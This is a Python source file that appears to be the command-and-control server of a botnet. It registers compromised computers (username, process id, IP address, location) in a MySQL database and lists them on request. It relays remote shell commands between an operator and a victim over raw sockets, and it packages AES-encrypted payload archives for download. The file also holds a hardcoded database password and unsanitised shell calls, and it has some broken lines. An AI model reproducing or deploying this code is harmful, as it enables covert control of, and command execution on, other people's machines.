
import mysql.connector
from ast import literal_eval
import socketserver
from threading import Thread
# from legend import server_legacy
import requests
import os, subprocess
import string, random
import socket, base64
from http.server import BaseHTTPRequestHandler
from urllib.parse import unquote


# ----------------------Encryption files--------------

import base64
import hashlib
import os

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes


class Encryptor:
    def __init__(self, key):
        self.__key__ = key

    def __encrypt(self, raw):
        BS = AES.block_size
        pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)

        raw = base64.b64encode(pad(raw).encode('ascii'))
        iv = get_random_bytes(AES.block_size)
        cipher = AES.new(key=self.__key__, mode= AES.MODE_CFB,iv= iv)
        return base64.b64encode(iv + cipher.encrypt(raw))

    def encrypt(self, fn):
        with open(fn, "r") as f:
            data = f.read()
        with open(fn, "w") as f:
            f.write(self.__encrypt(data).decode())

# ------------------------Encryption END----------------


config = {
    "host": "localhost",
    "user": "worker",
    "password": "forwh4t_subnet",
    "database": "net"
    # auth_plugin='mysql_native_password'
}

mydb = mysql.connector.connect(**config)

def connect(ip_s):
    s_r = socket.socket(2, 1)
    s_r.bind(("127.0.0.1", 65000))
    s_r.listen(5)
    client, addr = s_r.accept()
    print("Got client")

    s_s = socket.socket(2, 1)
    s_s.connect((ip_s, 8809))
        
    while True:
        com = s_s.recv(1024 * 4)
        client.send(com)
        ans = client.recv(1024)
        s_s.send(ans)
        cd = client.recv(1024)
        s_s.send(cd)
        if com.decode("cp65001") == "exit":
            break
    

def folder_encrypt(name, key):
    names = subprocess.getoutput("find " + name).split("\n")
    e = Encryptor(key)
    for name in names:
        if os.path.isfile(name):
            e.encrypt(name)
    del e
    return "done"

class Server(BaseHTTPRequestHandler):
    # def __init__(self, user='', pid='', pwd=''):
        # super(Server, self).__init__()

    def do_POST(self):
        creds = 'user:pass'.encode()
        creds1 = 'user:pas'.encode()
        ping_creds = 'ping:credentials'.encode()
        # print("do_POST")

        if self.headers.get('Authorization').split()[1] == str(base64.b64encode(ping_creds))[2:-1]:
            # self.wfile.write(b"JK")
            # print(str(self.rfile.read(int(self.headers.get('content-length'))))[2:-1])

            # self.wfile.close()
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()

        elif self.headers.get('Authorization').split()[1] == str(base64.b64encode(creds1))[2:-1]:
            # print(str(self.rfile.read( int(self.headers.get('content-length')) ))[2:-1])
            data = str(self.rfile.read( int(self.headers.get('content-length')) ))[2:-1]
            data = data.split("&")
            port = int(data[0].split("=")[-1])

            if port == 8081:
                dt = []
                for i in range(len(data)):
                    q = data[i].split("=")
                    q[0] = "'" + q[0] + "'"
                    q[1] = "'" + q[1] + "'"
                    q = ": ".join(q)
                    dt.append(q)

                dt = "{" + ", ".join(dt) + "}"
                dt = literal_eval(dt)
                try: requests.post("http://127.0.0.1:8000", auth=("user", "pass"), data=dt)
                except requests.exceptions.ConnectionError: pass
                
            if port == 7507:
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
            
                alias = data[1].spplit("=")[1]
                ip_s = data[2].split("=")[1]
                
                mydb = mysql.connector.connect(**config)
                mycursor = mydb.cursor()
                sql = "SELECT ip FROM computers where alias=%s;"
                val = [alias]
                mycursor.execute(sql)
                myresult = mycursor.fetchall()
                ip_c = myresult[0]
                s = socket.socket(2, 1)
                s.connect((ip_c, 9099))
                del s
                mycursor.close()
                mydb.close()
                connect(ip_s)

            if port == 3214:
                alias = data[-1].split("=")[-1]
                if alias == "all":
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    # self.wfile.write(data.encode("utf-8"))
                    # self.wfile.close()
                    mydb = mysql.connector.connect(**config)
                    mycursor = mydb.cursor()
                    mycursor.execute("SELECT * FROM computers;")
                    myresult = mycursor.fetchall()
                    myresult = str(myresult).encode()
                    # print(myresult)
                    self.wfile.write(myresult)
                else:
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    
                    alias = unquote(alias)
                    mycursor = mydb.cursor()
                    sql = "SELECT * FROM computers where alias=%s;"
                    val = [alias]
                    mydb = mysql.connector.connect(**config)
                    mycursor.execute(sql, val)
                    myresult = mycursor.fetchall()
                    myresult = str(myresult).encode()
                    # print(myresult)
                    mycursor.close()
                    mydb.close()
                    self.wfile.write(myresult)
                    
                    
            elif port == 3333:
                req_head = data
                # print(req_head)
                keys, vals = [], []

                for el in req_head:
                    key = unquote(el.split('=')[0])
                    val = unquote(el.split('=')[1])
                    keys.append(key)
                    vals.append(val)

                req_head = dict(zip(keys, vals))
                del keys
                del vals

                user = req_head.get('user')
                pid = req_head.get('pid')
                client_ip = req_head.get('ip')
                geo = req_head.get('geo')
                alias = req_head.get('alias')
                status = req_head.get('status')
		
                # print(user)

                del req_head
		
                if status == "register":
                    sql = "select * from computers where ip=%s;";
                    val = [client_ip]
                    mydb = mysql.connector.connect(**config)
                    mycursor = mydb.cursor()
                    mycursor.execute(sql, val)
                    myresult = mycursor.fetchall()
                    mycursor.close()
                    mydb.close()

                    if myresult != []:
                        # print(myresult)
                        sql = "update computers set alias=%s, username=%s, pid=%s, ip=%s, geo=%s where ip=%s or username=%s;"
                        val = (alias, user, pid, client_ip, geo, client_ip, user)

                    else:
                        # print(alias)
                        sql = "INSERT INTO computers (alias, username, pid, ip, geo) VALUES (%s, %s, %s, %s, %s);"
                        val = (alias, user, pid, client_ip, geo)

                elif status == "update":
                    sql = "update computers set username=%s, pid=%s, ip=%s, geo=%s where alias=%s;"
                    val = (user, pid, client_ip, geo, alias)
                
                mydb = mysql.connector.connect(**config)
                mycursor = mydb.cursor()
                mycursor.execute(sql, val)
                mydb.commit()
                mycursor.close()
                # print("success")
                mydb.close()

                self.send_response(200)
                self.end_headers()
            
            elif port == 10101:
                self.send_response(200)
                self.send_header("Content-type", "application/zip")
                self.end_headers()

                status = data[1].split("=")[1]
                key = unquote(data[2].split("=")[1])
                print(key)
                key = base64.b64decode(bytes(key, "utf-8"))
                

                if status == "update":
                    print(os.getenv("update"))
                elif status == "get":
                    name = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
                    
                    subprocess.getoutput("cp -r tmp_up " + name)
                    # try:
                    folder_encrypt(name, key)
                    subprocess.getoutput(f"zip -r {name}.zip {name}")
                    with open(name + ".zip", "rb") as f:
                        self.wfile.write(f.read())
                    # except Exception as e:
                    #     print(e)

                    subprocess.getoutput(f"rm -rf {name} {name}.zip")
                    
                    
        else:

            self.send_response(200)
            self.end_headers()

    def log_message(self, format, *args):
        return

host = socket.getaddrinfo(socket.gethostname(), None)
ipv4_addresses = [i[4][0] for i in host if i[0] == socket.AF_INET]
bot_serv_addr = ("0.0.0.0", 65000)
print(bot_serv_addr)

httpd = socketserver.TCPServer(bot_serv_addr, Server)
server = Thread(target=httpd.serve_forever, args=())
server.start()
